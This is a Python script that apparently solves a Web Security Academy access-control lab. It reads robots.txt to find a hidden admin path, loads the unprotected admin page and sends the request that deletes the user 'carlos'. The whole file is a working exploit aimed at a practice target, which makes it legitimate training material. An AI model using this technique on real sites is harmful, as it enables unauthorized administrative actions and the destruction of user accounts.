import requests
from bs4 import BeautifulSoup

site = "0a950001043bd976825674e6003900c2.web-security-academy.net"
s = requests.Session()

# Step 1: Parse robots.txt
robots_url = f'https://{site}/robots.txt'
resp = s.get(robots_url)
match_line = [line for line in resp.text.split('\n') if 'admin' in line]
uri = match_line[0].split(' ')[1]

# Step 2: Parse the admin page for the deletion link
admin_url = f'https://{site}{uri}'
resp = s.get(admin_url)
soup = BeautifulSoup(resp.text, 'html.parser')

# Step 3: Locate carlos's delete link
carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]
delete_uri = carlos_delete_link[0]['href']

# Step 4: Invoke deletion request
final_resp = s.get(f'https://{site}{delete_uri}')
print("Carlos deleted successfully." if final_resp.status_code == 200 else "Deletion failed.")
